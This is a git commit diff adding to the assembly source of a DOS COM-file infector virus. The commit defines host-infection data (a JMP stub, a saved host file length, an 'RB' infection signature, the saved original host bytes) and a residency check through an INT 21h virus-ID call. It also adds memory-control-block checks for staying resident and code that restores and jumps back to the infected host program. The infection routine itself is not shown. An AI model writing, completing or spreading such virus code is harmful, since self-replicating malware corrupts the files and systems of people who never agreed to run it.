4c98c97ba12e9212d9ed45ec84425f2683e34060
osher siman tov <oshered16@gmail.com>
2018-12-10 16:53:57 +0200

    more importent data and VIRUS_ALREADY_INSTALLED , CANNOT_INSTAL cases

--- data.asm
+++ data.asm
@@ -4,3 +4,16 @@
 nISRNumber EQU 21h
 nVirusID EQU 4BF7h ;has to be 4Bxxh where the range are xx=03 to FF
 _DX_DS dw 2 dup (?) ;DS:DX is stored here, first DX, then DS
+;------------------------- DON'T SEPERATE -------------------------
+HostBytesNew db 0E9h ;opcode for a JMP instruction
+wHostFileLength dw ? ;length of the host file (minus 3)
+VirusSignature db "RB" ;signature of the virus
+;------------------------- DON'T SEPERATE -------------------------
+HostBytesOld db 0CDh, 20h, ?
+;first three bytes of host file. The first two bytes are set to
+;INT 20h,so that when "this" file is executed without a host,
+;it quits when it tries to transfer control to the host.
+HostSignature db 2 dup (?) ;the virus signature is stored in bytes
+;4 and 5 of the host file. If the file is infected, these bytes
+;will be equal to "VirusSignature" defined below
+;---------------------------------------------------------------------
--- main.asm
+++ main.asm
@@ -23,10 +23,54 @@ mov ax, nVirusID
 int 21h
 cmp bx, nVirusID ;virus are installed ?
 je VIRUS_ALREADY_INSTALLED
+;RESIZE MEMORY BLOCK 
+mov ax, ds
+dec ax
+mov es, ax ;get MCB
+;ffset Size      Description
+; 00   byte   'M' 4Dh  member of a MCB chain, (not last)
+;            'Z' 5Ah  indicates last entry in MCB chain
+;           other values cause "Memory Allocation Failure" on exit
+; 01   word   PSP segment address of MCB owner (Process Id)
+;               possible values:
+;               0 = free
+;               8 = Allocated by DOS before first user pgm loaded
+;               other = Process Id/PSP segment address of owner
+; 03   word   number of paras related to this MCB (excluding MCB)
+; 05   11bytes  reserved
+; 08   8bytes  ASCII program name, NULL terminated if less than max
+;                length (DOS 4.x+)
+; 10   nbytes  first byte of actual allocated memory block
+;          - to find the first MCB in the chain, use  INT 21,52
+;           - DOS 3.1+ the first memory block contains the DOS data segment
+;                     ie., installable drivers, buffers, etc
+;               - DOS 4.x the first memory block is divided into subsegments,
+;                        with their own memory control blocks; offset 0000h is the first
+;                  - the 'M' and 'Z' are said to represent Mark Zbikowski
+;                  - the MCB chain is often referred to as a linked list, but
+;                    technically isn't
+cmp byte ptr es:[0],'Z' ;is it the last MCB in the chain ?
+jne CANNOT_INSTALL
 
 
 
+
+
+
+CANNOT_INSTALL:
 VIRUS_ALREADY_INSTALLED:
+;TRANSFER CONTROL TO HOST PROGRAM 
+push cs
+push cs
+pop ds
+pop es
+mov di, 100h
+lea si, bp+HostBytesOld
+mov cx,5 ;restore 5 bytes
+rep movsb
+mov bx, 100h
+push bx
+ret ;transfer to host program
 
 END_OF_CODE:
 end start
